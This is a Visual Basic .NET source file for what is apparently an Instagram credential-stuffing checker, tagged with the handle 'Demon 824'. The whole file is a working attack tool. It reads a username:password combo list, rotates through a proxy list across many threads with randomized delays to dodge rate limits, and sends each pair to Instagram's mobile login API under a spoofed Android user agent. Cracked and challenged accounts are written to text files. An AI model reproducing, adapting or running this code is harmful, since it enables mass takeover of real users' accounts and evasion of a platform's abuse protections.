Imports System.Net
Imports System.IO
Imports System.Threading
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Text.RegularExpressions
Public Class Form1
    '// Demon                               824   
    '// Inst                               @_824
    Public ListCounts As Integer
    Public list As String()
    Public ProxiesCounts As Integer
    Public Proxies As List(Of String) = New List(Of String)(File.ReadAllLines("proxies.txt"))
    Public StopCheck As Boolean
    Public Username As String
    Public Password As String
    Public Mid As String
    Public Token As String
    Public Cookie As CookieContainer = New CookieContainer()
    Public StopSend As Boolean = False
    Private Sub ThreadingSystem()
        '// Demon 824 
        '// Inst @_824
        Dim num As Integer = Conversions.ToInteger(xThreading.Text)
        Dim Random = New Random()
        Dim i As Integer = 0
        Try
            Do While i <= num
                Dim Threading As Thread = New Thread(New ThreadStart(AddressOf ListSystem))
                Threading.Start()
                Thread.Sleep(Random.Next(700, 1500))
                i += 1
            Loop
        Catch ex As Exception
        End Try
    End Sub
    '// Demon 824 
    '// Inst @_824
    Private Sub ListSystem()
        '// Demon 824 
        '// Inst @_824
        While Not StopCheck
            Dim Random = New Random()
            Try
                Dim text As String
                text = list(0)
                ListCounts += 1
                If ListCounts > list.Length Then
                    ListCounts = 0
                End If
                text = list(ListCounts)
                If text.Contains(":") Then
                    Username = text.Split(New Char() {":"c})(0).Trim()
                    Password = text.Split(New Char() {":"c})(1).Trim()
                End If
                ProxiesCounts += 1
                If ProxiesCounts > Proxies.Count - 1 Then
                    ProxiesCounts = 0
                End If
                LogGuess(Username, Password, Proxies(ProxiesCounts))
            Catch ex As Exception
            End Try
            Thread.Sleep(Random.Next(700, 1500))
        End While
    End Sub
    '// Demon 824 
    '// Inst @_824
    Private Function LogGuess(user As String, pass As String, proxy As String) As Object
        '// Demon 824 
        '// Inst @_824
        Try
            Dim Guidd = Guid.NewGuid().ToString()
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(String.Concat(New String() {"reg_login=0&login_attempt_count=0&device_id=", Guidd, "&phone_id=", Guidd, "&password=", Password, "&username=", Username}))
            With DirectCast(WebRequest.Create("https://i.instagram.com/api/v1/accounts/login/"), HttpWebRequest)
                .Proxy = New WebProxy(proxy)
                .Method = "POST"
                .Host = "i.instagram.com"
                .UserAgent = "Instagram 8.14.0 Android (18/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; bg_BG)"
                .ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
                .Headers.Add("Accept-Language", "en;q=1")
                .ContentLength = bytes.Length
                .Pipelined = True
                .KeepAlive = True
                .Timeout = 100000
                .CookieContainer = New CookieContainer()
                .ServicePoint.Expect100Continue = False
                .ServicePoint.UseNagleAlgorithm = False
                .ServicePoint.ConnectionLimit = Integer.MaxValue
                .ServicePoint.ConnectionLeaseTimeout = 100000
                With .GetRequestStream()
                    .Write(bytes, 0, bytes.Length) : .Close()
                End With
                Dim WebResponse As HttpWebResponse : Try : WebResponse = DirectCast(.GetResponse(), HttpWebResponse) : Catch ex As WebException : WebResponse = DirectCast(ex.Response(), HttpWebResponse) : End Try
                Using StreamReader As StreamReader = New StreamReader(WebResponse.GetResponseStream())
                    Dim Respon = StreamReader.ReadToEnd
                    If Respon.Contains("logged_in_user") Then
                        Label4.Text += 1
                        My.Computer.FileSystem.WriteAllText("true.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
                    ElseIf Respon.Contains("challenge") Then
                        Label1.Text += 1
                        My.Computer.FileSystem.WriteAllText("challenge.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
                        Return Send_rest(user, pass, proxy)
                    ElseIf Respon.Contains("Please wait") Or Respon.Contains("rate_limit_error") Or Respon.Contains("generic_request_error") Then
                        Label9.Text += 1
                    Else
                        Label7.Text += 1
                    End If
                End Using
            End With
        Catch ex As Exception
        End Try
        Return False
    End Function
    '// Demon 824 
    '// Inst @_824
    Private Function Send_rest(user As String, pass As String, proxy As String) As Object
        '// Demon 824 
        '// Inst @_824
        Try
            Dim random = New Random()
            Dim Guidd = Guid.NewGuid().ToString()
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(String.Concat(New String() {"username_or_email=", user, "&device_id=", Guidd}))
            With DirectCast(WebRequest.Create("https://i.instagram.com/api/v1/accounts/sign_in_help/"), HttpWebRequest)
                .Proxy = New WebProxy(proxy)
                .Method = "POST"
                .Host = "i.instagram.com"
                .UserAgent = "Instagram 8.14.0 Android (18/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; bg_BG)"
                .ContentType = "application/x-www-form-urlencoded; charset=UTF-8"
                .Headers.Add("Accept-Language", "en;q=1")
                .ContentLength = bytes.Length
                .Pipelined = True
                .KeepAlive = True
                .Timeout = 100000
                .CookieContainer = New CookieContainer()
                .ServicePoint.Expect100Continue = False
                .ServicePoint.UseNagleAlgorithm = False
                .ServicePoint.ConnectionLimit = Integer.MaxValue
                .ServicePoint.ConnectionLeaseTimeout = 100000
                With .GetRequestStream()
                    .Write(bytes, 0, bytes.Length) : .Close()
                End With
                Dim WebResponse As HttpWebResponse : Try : WebResponse = DirectCast(.GetResponse(), HttpWebResponse) : Catch ex As WebException : WebResponse = DirectCast(ex.Response(), HttpWebResponse) : End Try
                Using StreamReader As StreamReader = New StreamReader(WebResponse.GetResponseStream())
                    Dim Respon = StreamReader.ReadToEnd
                    If Respon.Contains("user_not_found") Then
                        Label6.Text += 1
                        My.Computer.FileSystem.WriteAllText("Need Number.txt", String.Concat(New String() {user, ":" + pass + vbCrLf}), True)
                    ElseIf Respon.Contains("Please wait") Then
                        Return Send_rest(user, pass, proxy)
                    End If
                End Using
            End With
        Catch ex As Exception
        End Try
        Return False
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        '// Demon 824 
        '// Inst @_824
        Dim thread As Thread = New Thread(New ThreadStart(AddressOf ThreadingSystem))
        thread.Start()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        '// Demon 824 
        '// Inst @_824
        Try
            Dim openFile = New OpenFileDialog With {
                .CheckFileExists = True,
                .CheckPathExists = True,
                .DefaultExt = "txt",
                .Multiselect = False,
                .Filter = "list(*.txt)|*.txt"
            }
            If openFile.ShowDialog() = DialogResult.OK Then
                list = File.ReadAllLines(openFile.FileName)
                Dim source As List(Of String) = New List(Of String)(list)
                list = source.[Select](Function(s As String) s).Distinct().ToArray()
                Label12.Text = list.Length
            End If
        Catch ex As Exception
            MsgBox("Error")
        End Try
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ThreadPool.SetMinThreads(Integer.MaxValue, Integer.MaxValue)
        ServicePointManager.DefaultConnectionLimit = Integer.MaxValue
    End Sub
    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles MyBase.Closed
        End
    End Sub
    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click

    End Sub
    Private Sub Label12_Click(sender As Object, e As EventArgs) Handles Label12.Click
        Label12.Text = list.Length
    End Sub
End Class
